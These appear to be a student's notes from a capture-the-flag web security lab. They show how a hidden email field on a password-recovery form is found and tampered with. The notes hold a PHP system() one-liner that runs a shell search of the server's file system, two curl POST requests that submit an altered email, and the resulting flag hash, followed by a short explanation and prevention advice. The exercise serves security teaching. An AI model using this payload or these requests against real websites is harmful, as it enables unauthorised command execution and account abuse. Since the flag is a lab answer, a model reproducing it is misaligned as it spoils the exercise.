<?php system(‘find / -name *flag*’); ?>

inspect and there is a hidden input form 

we can see an email

curl -F 'Submit=Submit' -X POST http://172.20.10.9/\?page\=recover 

curl -d "email=webmaster@borntosec.com&Submit=Submit" -X POST http://172.20.10.9/index.php\?page\=recover


1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0


Use
[Hidden fields use] exposes the inner workings of your application, and exposes data to trivial tampering, replay, and validation attacks


Prevention
Data sent to the user must be validated on the server once the last page has been received

